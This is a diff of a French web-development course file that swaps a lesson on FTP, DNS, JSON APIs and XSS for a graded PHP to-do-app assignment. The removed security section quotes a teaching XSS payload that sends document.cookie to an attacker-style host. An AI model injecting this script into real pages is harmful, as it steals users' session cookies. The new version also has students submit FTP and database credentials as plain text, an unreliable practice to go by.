@@ -1,184 +1,88 @@
-# Session 3 : Déploiement et concepts avancés
+## Session 3: Creation et mise en production d'un gestionnaire de tâches personnel
 
-## Objectifs pédagogiques
+**Durée :** 4h 
+**Modalité :** Individuel  (avec guidance pour la mise en production)
+**Barème :** /20 points
 
-- Mettre en ligne une application web  
-- Travailler avec des services web et des données JSON  
-- Comprendre les bases de la sécurité côté client et côté serveur
+### Objectif
+Créer une application web complète de gestion de tâches personnelles intégrant BDD, PHP et sécurité, puis la déployer en production.
 
----
+### Spécifications techniques
 
-## 1. Déploiement web
-
-### Transfert de fichiers par FTP
-
-**FTP** (File Transfer Protocol) permet de transférer des fichiers depuis ton ordinateur vers un serveur web.
-
-**Étapes :**
-
-- Installer un client FTP comme **FileZilla**  
-- Se connecter avec les identifiants fournis par l’hébergeur  
-- Transférer les fichiers du projet dans le dossier `www` ou `public_html`  
-
-> Exemple : transférer `index.html` pour qu’il soit visible sur le site.
-
-### Gestion de domaine et configuration DNS
-
-Un **nom de domaine** (ex : `monsite.fr`) pointe vers une adresse IP.
-
-**Notions à connaître :**
-
-- **Enregistrement A** : lie un domaine à une adresse IP  
-- **Enregistrement CNAME** : redirige vers un autre nom de domaine  
-- **Enregistrement MX** : gère les e-mails  
-
-> Exemple : configurer `www.monsite.fr` pour qu’il affiche le site hébergé.
-
----
-
-## 2. Introduction aux APIs JSON
-
-### Qu’est-ce que JSON ?
-
-**JSON** (JavaScript Object Notation) est un format léger pour représenter des données sous forme de texte.
-
-```json
-{
-  "nom": "Alice",
-  "age": 30,
-  "email": "alice@example.com"
-}
+**Base de données `todo_app`**
+```sql
+CREATE TABLE taches (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    titre VARCHAR(255) NOT NULL,
+    description TEXT,
+    statut ENUM('todo', 'progress', 'done') DEFAULT 'todo',
+    priorite INT DEFAULT 0,
+    date_creation TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    date_echeance DATE
+);
 ```
 
-Chaque élément est une **paire clé/valeur**.
+### Fonctionnalités requises
 
-### Créer une API simple en PHP
+#### 1. Interface principale (`index.php`) - 5 pts
+- Affichage des tâches par statut (3 colonnes : À faire / En cours / Terminé)
+- Possibilité de changer le statut (liens/boutons)
+- Indicateur visuel pour priorité haute (0 bas, 5 haut)
+- Bonus: tri par date d'échéance / priorité (javascript)
 
+#### 2. Ajout de tâche (`ajouter.php`) - 4 pts
+- Formulaire avec validation côté serveur
+- Champs : titre (obligatoire), description, priorité, date d'échéance
+- Gestion d'erreurs avec retour utilisateur
+
+#### 3. API JSON (`api.php`) - 3 pts
 ```php
-<?php
-$data = ["nom" => "Alice", "age" => 30];
-header('Content-Type: application/json');
-echo json_encode($data);
-?>
+// GET uniquement : retourner toutes les tâches en JSON
+// ?statut=todo pour filtrer par statut
+// ?priorite=haute pour filtrer par priorité
 ```
 
-### Consommer une API
+#### 4. Sécurité - 3 pts
+- Utilisation de requêtes préparées
+- Protection XSS basique
 
-#### Étape 1 : Obtenir une clé API
+#### 5. Mise en production - 5 pts
+- **Déploiement sur serveur Gandi**
+- Configuration BDD en ligne
+- Transfert FTP via FileZilla
+- Site fonctionnel accessible via URL fournie
+- Documentation des identifiants de connexion
 
-Avant de pouvoir interroger l'API, vous devez obtenir une clé :
+### Bonus - 2 pts
+- **Modification de tâches** (`modifier.php`)
+  - Formulaire pré-rempli
+  - Update en base
+  - Redirection après modification
 
-- Rendez-vous sur [https://thecatapi.com/signup](https://thecatapi.com/signup)  
-- Inscrivez-vous gratuitement  
-- Une clé API vous sera fournie, à utiliser dans les requêtes  
-
-#### Avec JavaScript (`fetch`)
-
-```js
-fetch('https://api.thecatapi.com/v1/images/search', {
-  headers: {
-    'x-api-key': 'VOTRE_CLE_API'
-  }
-})
-  .then(response => response.json())
-  .then(data => {
-    console.log(data);
-    const img = document.createElement('img');
-    img.src = data[0].url;
-    document.body.appendChild(img);
-  });
+### Fichiers attendus
+```
+/mon_todo/
+├── index.php          # Interface principale
+├── ajouter.php         # Formulaire d'ajout
+├── modifier.php        # Modification de tâche (bonus)
+├── traitement.php      # Traitement des actions
+├── api.php            # API JSON (GET only)
+├── connexion.php      # Connexion BDD
+├── connexion_prod.php  # Connexion BDD production
+└── style.css          # CSS basique (optionnel)
 ```
 
-#### Avec PHP (`curl`)
+### Critères d'évaluation
+- **Fonctionnalité** (7/20) : L'application fonctionne selon les specs
+- **Code PHP** (5/20) : Structure, lisibilité, bonnes pratiques
+- **Sécurité** (3/20) : Validation, requêtes préparées, XSS
+- **Déploiement** (5/20) : Site en ligne, BDD configurée, accès fonctionnel
 
-```php
-<?php
-$curl = curl_init();
+### Livrables
+1. **GIT repo** : Le code complet + export SQL de la base
+2. **URL production** : Lien vers le site déployé sur Gandi
+3. **Documentation** : Fichier texte avec identifiants FTP/BDD utilisés
 
-curl_setopt_array($curl, [
-    CURLOPT_URL => "https://api.thecatapi.com/v1/images/search",
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_HTTPHEADER => [
-        "x-api-key: VOTRE_CLE_API"
-    ]
-]);
+**Deadline :** Fin de séance
 
-$response = curl_exec($curl);
-curl_close($curl);
-
-$data = json_decode($response, true);
-echo "<img src='" . $data[0]['url'] . "' />";
-?>
-```
-
----
-
-## 3. Sécurité
-
-### Attaque XSS (Cross-Site Scripting)
-
-Une attaque **XSS** consiste à injecter du code JavaScript malveillant dans une application web vulnérable.
-
-> Exemple réaliste :  
-> Un utilisateur entre ce code dans un champ commentaire :
-> ```html
-> <script>document.location='https://badbadnotgood.com/voler-cookie?cookie=' + document.cookie;</script>
-> ```
-
-Ce script vole les cookies de session de l’utilisateur.
-
-### Bonnes pratiques
-
-- Utiliser `htmlspecialchars()` pour afficher des données utilisateur  
-- Valider les entrées côté serveur  
-- Éviter l’injection de balises HTML  
-- Utiliser des tokens **CSRF** pour sécuriser les formulaires  
-
----
-
-## Activité : Gagne ton sous-domaine !
-
-À travers les projets des **sessions 1 et 2**, un ou une gagnante sera sélectionnée pour :
-
-- Obtenir un **sous-domaine personnalisé** (ex : `monprojet.monsite.fr`)  
-- Publier son projet sur un serveur **Gandi** ou **Hostinger**  
-- Utiliser **FileZilla** pour le transfert FTP  
-
-### Étapes de publication
-
-**1. Préparer ton projet**
-
-- Fichier `index.html` ou `index.php` à la racine  
-- Dossiers organisés : `css/`, `js/`, `images/`, etc.  
-
-**2. Installer FileZilla**
-
-Téléchargement : [https://filezilla-project.org](https://filezilla-project.org)
-
-**3. Connexion FTP**
-
-Tu recevras :
-
-- Adresse FTP (ex : `ftp.monsite.fr`)  
-- Identifiant et mot de passe  
-- Port : `21`  
-
-**Configuration dans FileZilla :**
-
-- Hôte : `ftp.monsite.fr`  
-- Identifiant : ton login  
-- Mot de passe : ton mot de passe FTP  
-- Port : `21`  
-
-Transfère tes fichiers dans le dossier `www` ou `public_html`.
-
-### Ton site est en ligne
-
-Accès à ton projet :  
-`https://tonnom.monsite.fr`
-
-### Pourquoi participer ?
-
-- Créer ton premier **portfolio web**  
-- Expérimenter une vraie mise en ligne  
-- Partager ton travail avec ton entourage ou de futurs employeurs  
+**Note :** Les identifiants de production seront fournis en fin de séance.
